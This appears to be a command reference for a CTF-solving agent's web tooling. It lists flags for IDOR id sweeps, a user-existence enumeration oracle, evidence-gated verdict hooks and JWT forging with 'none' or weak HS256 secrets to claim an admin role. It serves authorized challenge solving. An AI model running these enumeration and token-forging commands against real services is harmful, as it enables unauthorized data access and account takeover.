# Tooling — the exact commands

The repository's tools for this class. Verified flags only — the
`post-probe` response gate means hand-rolled commands are the exception.

---

## 1. `id_sweep` — the enumeration

```bash
python3 tools/web/id_sweep.py --url "$BASE/api/users/{id}" \
  --header "Cookie: session=$B" --range 1-100 \
  --hit-regex '"email"|"role"|"username"' \
  --miss-regex '404|"error"|"not found"' \
  --rate 10 --limit 100
```

Flags:

- `--url "{id}"` — the `{id}` placeholder is the sweep slot.
- `--id <start>` / `--range <a-b>` — the range.
- `--header "..."` — a header to send (repeatable); the `{id}` placeholder
  also works inside `--header`/`--body`/`--param`.
- `--method GET|POST|PUT|PATCH|DELETE` — the HTTP method.
- `--body '...'` — a body with `{id}`.
- `--param 'name={id}'` — a query param.
- `--hit-regex` / `--miss-regex` — classify the response; a `hit` is a
  match on `--hit-regex`, a `miss` on `--miss-regex`.
- `--mutate '<expr>'` — rebuild the id per `i` (`str(i).zfill(4)`,
  `f"user_{i}"`, `base64(f"User:{i}")`).
- `--wordlist <file>` — ids from a wordlist instead of a range.
- `--limit <n>` — the max requests.
- `--rate <n>` — req/s.
- `--retries <n>` — on 5xx/timeout.
- `--timeout <s>` — per request.
- `--no-follow` — don't follow redirects.
- `--no-baseline` — skip the baseline check.
- `--sample-chars <n>` — the response sample size.
- `--out <file>` — write hits to a file.
- `--bulk` / `--bulk-sep` — the bulk-carrier shape (`ids=1,2,3`).
- `--compact` — one-line output per hit.
- `--format json` — JSON output.
- `--stdin` — read ids from stdin.
- `--stop-on-flag` — stop on a flag-shaped hit.

## 2. `enum_probe` — the user/id oracle

```bash
python3 tools/web/enum_probe.py --url "$BASE/api/users" \
  --known-user alice --method GET \
  --headers 'Cookie: session=$B' --timeout 10 --selftest
```

Flags:

- `--url` — the endpoint.
- `--method` — GET/POST.
- `--headers` — the headers.
- `--known-user` — a user that exists (the positive).
- `--body` — the POST body.
- `--pass-field` — the password field name (for login-enum).
- `--timeout` — per request.
- `--selftest` — the offline self-test.

`enum_probe` runs the user-existence oracle — `200` on `alice`, `404`
on `nobody_xyz` — the differential is the enumeration surface.

## 3. `http_probe` — the response-bound probe

```bash
python3 tools/web/http_probe.py --challenge "$C" --class web-idor \
  --url "$BASE/api/notes/1001" --header "Cookie: session=$B" \
  --evidence-regex '"owner_id"\s*:\s*1|"email"\s*:\s*"a@|"text"\s*:\s*"A-' \
  --evidence-kind impact --on-match confirms --on-miss refutes
```

`http_probe` holds request+response together — the `--evidence` is
verified a substring of `--response`. The `confirms` is the proof.

## 4. `hooks.py` — the verdict gate

```bash
# the hypothesis
python3 tools/hooks.py pre-probe "$C" --class web-idor \
  --request "GET /api/notes/1001" --hypothesis-id H1

# the verdict — --response must contain --evidence verbatim
python3 tools/hooks.py post-probe "$C" --class web-idor \
  --hypothesis-id H1 --verdict confirms --evidence-kind impact \
  --evidence '"owner_id":1,"text":"A-secret"' \
  --response '{"id":1001,"owner_id":1,"text":"A-secret"}'

# a flag — --value the candidate, --response the bytes it was read from
python3 tools/hooks.py pre-flag "$C" --value 'flag{...}' \
  --source "$BASE/api/notes/1001" --evidence 'HTTP/1.1 200 OK ... flag{...}'
```

`pre-flag` rejects a flag-shaped string not present in `--evidence`.

## 5. `state.py` — the ledger

```bash
python3 tools/state.py "$C" --hypothesis "H1: /api/notes/{id} scopes" --bug-class web-idor
python3 tools/state.py "$C" --hypothesis-id <id> --deprioritize "denied on every carrier"
python3 tools/state.py "$C" --hypothesis-id <id> --revive "new id leak found"
python3 tools/state.py "$C" --strategy-used chain_match
```

## 6. `decide.py` — the controller

```bash
python3 tools/decide.py "$C"
```

`decide` returns the next action — `run_probe`, `switch_class`,
`escalate`, `stop_report` — from the ledger.

## 7. `chain_match` — has this shape been solved

```bash
python3 tools/chain_match.py --record "$C"
```

A card's `first_confirming_probe` is the cheapest next step on a match.

## 8. `jwt_forge` / `session_dissect` — the token side

```bash
python3 tools/web/session_dissect.py --token "$JWT" --wordlist /path/words
python3 tools/web/jwt_forge.py --alg none --claims '{"sub":1,"role":"admin"}'
python3 tools/web/jwt_forge.py --alg HS256 --secret key --claims '{"sub":1}'
```

The `sub`/`uid`/`role` claim is the IDOR carrier — `jwt_forge` forges
it if the signature is weak/none.

## 9. `variant_matrix` — the shape question

```bash
python3 tools/web/variant_matrix.py --url "$BASE/api/users/{id}" \
  --header "Cookie: session=$B" --dry-run
```

`--dry-run` prints which request-shape family to try — the id-coerce
shapes (`int`, `str`, `arr`, `obj`).

## 10. `classify.py` / `ctf.py` — the entry

```bash
python3 tools/classify.py "a /api/users/{id} endpoint, sequential ids"
python3 ctf.py "<obs>"
```

`classify` names the class; `ctf.py` routes.
